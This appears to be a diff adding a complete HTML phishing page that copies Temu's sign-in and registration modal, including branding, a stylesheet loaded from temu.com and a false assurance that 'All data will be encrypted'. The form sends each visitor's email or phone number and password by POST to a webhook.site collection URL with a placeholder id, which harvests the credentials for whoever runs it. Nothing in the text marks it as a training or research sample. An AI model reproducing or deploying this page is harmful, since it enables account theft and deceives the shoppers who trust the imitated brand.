@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Temu – Sign in / Register</title>
+  <link rel="stylesheet" href="https://www.temu.com/static/css/login-modal.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+    .modal-container {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .modal-box {
+      background: #fff;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      padding: 24px;
+      text-align: center;
+    }
+    .modal-box h2 {
+      font-size: 20px;
+      margin: 0 0 10px;
+    }
+    .modal-box .secure-text {
+      color: green;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    .submit-btn {
+      background-color: #ff7300;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .footer-text {
+      font-size: 12px;
+      color: #666;
+      margin-top: 10px;
+    }
+    .logo-bar {
+      padding: 12px 20px;
+      background-color: #000;
+      color: white;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-bar">TEMU</div>
+  <div class="modal-container">
+    <div class="modal-box">
+      <h2>Sign in / Register</h2>
+      <p class="secure-text">🔒 All data will be encrypted</p>
+      <form action="https://webhook.site/YOUR-UUID-HERE" method="POST">
+        <div class="form-group">
+          <label for="email">Email or phone number</label>
+          <input type="text" id="email" name="email" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        <button class="submit-btn" type="submit">Sign in</button>
+      </form>
+      <div class="footer-text">
+        By continuing, you agree to our Terms of Use and Privacy Policy.
+      </div>
+    </div>
+  </div>
+</body>
+</html>
